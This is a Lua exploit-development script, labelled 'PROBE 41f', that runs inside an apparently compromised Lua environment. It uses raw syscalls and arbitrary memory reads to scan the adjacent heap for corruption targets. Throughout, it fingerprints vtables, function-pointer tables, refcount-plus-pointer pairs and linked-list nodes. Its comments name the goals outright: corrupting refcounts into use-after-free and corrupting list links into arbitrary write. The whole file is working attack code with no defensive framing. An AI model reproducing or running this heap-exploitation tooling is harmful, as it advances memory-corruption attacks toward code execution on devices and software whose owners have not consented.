-- CRASH_CLASS: SAFE (read-only scan of adjacent heap)
-- PROBE 41f: fingerprint heap objects for vtables / function pointers
-- We have full R/W on adjacent heap. Now find corruption targets:
--   - vtable pointers (ptr to array of ptrs in text/rodata)
--   - function pointers (direct ptr into executable .text)
--   - refcounts adjacent to pointers (corrupt refcount -> UAF)
--   - linked list nodes (corrupt next/prev -> arbitrary write)

print("=== PROBE 41f: HEAP OBJECT FINGERPRINTING ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then
        return val.h, val.l
    end
    return 0, to_num(val)
end

local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local base = do_mmap(PAGE)
if not base then
    print("mmap FAILED")
    return
end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- Classify a 64-bit value
--------------------------------------------------------------------
local function classify(hi, lo)
    if hi == 0 and lo == 0 then return "zero" end
    if hi == 0xAFAFAFAF and lo == 0xAFAFAFAF then return "freed" end
    if hi == 0xDEADDEAD then return "freed" end

    -- kernel range
    if hi >= 0xFFFFFF80 then return "kptr" end

    -- executable text (modules at 0x80xxxxxxx from probe 39b)
    if hi == 0 and lo >= 0x80000000 and lo < 0x90000000 then return "text_ptr" end

    -- our heap area 0x3_1xxxxxxx
    if hi >= 0x00000003 and hi <= 0x00000003 and lo >= 0x10000000 then return "heap_ptr" end

    -- other heap 0x2_xxxxxxxx or 0x3_0xxxxxxx
    if hi >= 0x00000002 and hi <= 0x00000003 then return "heap_other" end

    -- small (refcount, size, flags)
    if hi == 0 and lo < 0x10000 then return "small" end

    -- negative small (error codes)
    if hi == 0xFFFFFFFF and lo >= 0xFFFF0000 then return "neg_small" end

    return "other"
end

--------------------------------------------------------------------
-- SECTION 1: Full object scan — read every qword in 512 pages
-- Look for patterns: [ptr][ptr][small] = vtable+data object
--------------------------------------------------------------------
print("--- SECTION 1: OBJECT PATTERN SCAN ---")

local vtable_candidates = {}
local fptr_candidates = {}
local linked_list = {}
local refcount_ptrs = {}
local text_ptrs = {}

local scan_pages = 0
local total_qwords = 0

for i = 1, 512 do
    local page_base = base - i * 0x1000
    if page_base <= 0 then break end

    local test = safe_rd(page_base)
    if test == nil then break end
    scan_pages = scan_pages + 1

    -- read page in 8-byte strides, look for patterns
    -- but limit to every 0x10 to keep runtime reasonable (8 qwords per 0x80)
    for off = 0, 0xFE0, 0x10 do
        local addr = page_base + off
        local q0 = safe_rq(addr)
        local q1 = safe_rq(addr + 8)
        if q0 and q1 then
            local h0, l0 = get_hi_lo(q0)
            local h1, l1 = get_hi_lo(q1)
            local c0 = classify(h0, l0)
            local c1 = classify(h1, l1)
            total_qwords = total_qwords + 2

            -- Pattern: text_ptr followed by anything = possible function pointer
            if c0 == "text_ptr" then
                if #text_ptrs < 48 then
                    text_ptrs[#text_ptrs + 1] = {
                        addr = addr, val = dump_qword(q0),
                        next_class = c1, next_val = dump_qword(q1)
                    }
                end
            end

            -- Pattern: heap_ptr, heap_ptr = linked list node or vtable
            if c0 == "heap_ptr" and c1 == "heap_ptr" then
                if #linked_list < 32 then
                    linked_list[#linked_list + 1] = {
                        addr = addr, v0 = dump_qword(q0), v1 = dump_qword(q1)
                    }
                end
            end

            -- Pattern: small (1-4) followed by heap_ptr = refcount + ptr
            if c0 == "small" and l0 >= 1 and l0 <= 16 and c1 == "heap_ptr" then
                if #refcount_ptrs < 32 then
                    refcount_ptrs[#refcount_ptrs + 1] = {
                        addr = addr, refcount = l0, ptr = dump_qword(q1)
                    }
                end
            end

            -- Pattern: heap_ptr followed by text_ptr = vtable candidate
            if c0 == "heap_ptr" and c1 == "text_ptr" then
                if #vtable_candidates < 32 then
                    vtable_candidates[#vtable_candidates + 1] = {
                        addr = addr, heap = dump_qword(q0), text = dump_qword(q1)
                    }
                end
            end

            -- Pattern: text_ptr followed by text_ptr = function table
            if c0 == "text_ptr" and c1 == "text_ptr" then
                if #fptr_candidates < 32 then
                    fptr_candidates[#fptr_candidates + 1] = {
                        addr = addr, f0 = dump_qword(q0), f1 = dump_qword(q1)
                    }
                end
            end
        end
    end
end

print("scanned: " .. scan_pages .. " pages, " .. total_qwords .. " qwords")
print("")

--------------------------------------------------------------------
-- SECTION 2: Text pointers (executable code addresses)
--------------------------------------------------------------------
print("--- SECTION 2: TEXT POINTERS (" .. #text_ptrs .. ") ---")
for j, t in ipairs(text_ptrs) do
    if j > 24 then
        print("  ... " .. (#text_ptrs - 24) .. " more")
        break
    end
    print(string.format("  %s: %s [next: %s %s]",
        hex(t.addr), t.val, t.next_class, t.next_val))
end
print("")

--------------------------------------------------------------------
-- SECTION 3: Function pointer tables (text+text)
--------------------------------------------------------------------
print("--- SECTION 3: FUNCTION TABLES (" .. #fptr_candidates .. ") ---")
for j, f in ipairs(fptr_candidates) do
    if j > 16 then
        print("  ... " .. (#fptr_candidates - 16) .. " more")
        break
    end
    -- read more to see if it's a longer table
    local depth = 2
    for k = 1, 6 do
        local qn = safe_rq(f.addr + 8 + k * 8)
        if qn then
            local hn, ln = get_hi_lo(qn)
            if classify(hn, ln) == "text_ptr" then
                depth = depth + 1
            else
                break
            end
        end
    end
    print(string.format("  %s: %s %s (depth=%d)",
        hex(f.addr), f.f0, f.f1, depth))
end
print("")

--------------------------------------------------------------------
-- SECTION 4: Vtable candidates (heap_ptr + text_ptr)
--------------------------------------------------------------------
print("--- SECTION 4: VTABLE CANDIDATES (" .. #vtable_candidates .. ") ---")
for j, v in ipairs(vtable_candidates) do
    if j > 16 then
        print("  ... " .. (#vtable_candidates - 16) .. " more")
        break
    end
    print(string.format("  %s: heap=%s text=%s", hex(v.addr), v.heap, v.text))
end
print("")

--------------------------------------------------------------------
-- SECTION 5: Linked list nodes (heap_ptr + heap_ptr)
--------------------------------------------------------------------
print("--- SECTION 5: LINKED LISTS (" .. #linked_list .. ") ---")
for j, l in ipairs(linked_list) do
    if j > 16 then
        print("  ... " .. (#linked_list - 16) .. " more")
        break
    end
    print(string.format("  %s: %s -> %s", hex(l.addr), l.v0, l.v1))
end
print("")

--------------------------------------------------------------------
-- SECTION 6: Refcount + pointer pairs
--------------------------------------------------------------------
print("--- SECTION 6: REFCOUNT+PTR (" .. #refcount_ptrs .. ") ---")
for j, r in ipairs(refcount_ptrs) do
    if j > 16 then
        print("  ... " .. (#refcount_ptrs - 16) .. " more")
        break
    end
    print(string.format("  %s: rc=%d ptr=%s", hex(r.addr), r.refcount, r.ptr))
end
print("")

--------------------------------------------------------------------
-- SECTION 7: Dereference text pointers — are they in .text?
-- Read bytes at the pointer target to see if they look like code
--------------------------------------------------------------------
print("--- SECTION 7: TEXT PTR DEREFERENCE ---")
do
    local tested = 0
    for _, t in ipairs(text_ptrs) do
        if tested >= 8 then break end
        -- extract the address from the qword
        local q = safe_rq(t.addr)
        if q then
            local hi, lo = get_hi_lo(q)
            -- text ptrs are in 0x8xxxxxxx range (32-bit)
            if hi == 0 and lo >= 0x80000000 and lo < 0x90000000 then
                local ok_r, byte0 = pcall(function() return memory.read_dword(lo) end)
                if ok_r then
                    local bv = to_num(byte0)
                    -- check if it could be x86 code (common prefixes)
                    local b0 = bv % 256
                    local looks_like_code = (
                        b0 == 0x55 or  -- push rbp
                        b0 == 0x48 or  -- REX.W prefix
                        b0 == 0x41 or  -- REX.B
                        b0 == 0x89 or  -- mov
                        b0 == 0xE8 or  -- call
                        b0 == 0xE9 or  -- jmp
                        b0 == 0xCC or  -- int3
                        b0 == 0xC3 or  -- ret
                        b0 == 0x53 or  -- push rbx
                        b0 == 0x57     -- push rdi
                    )
                    local tag = looks_like_code and "CODE" or "DATA"
                    print(string.format("  *%s -> %s [%s] b0=%02X",
                        hex(lo), hex(bv), tag, b0))
                    tested = tested + 1
                else
                    print(string.format("  *%s -> FAULT (not mapped)", hex(lo)))
                    tested = tested + 1
                end
            end
        end
    end
    if tested == 0 then
        print("  no text pointers to dereference")
    end
end

print("")
pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41f COMPLETE ===")
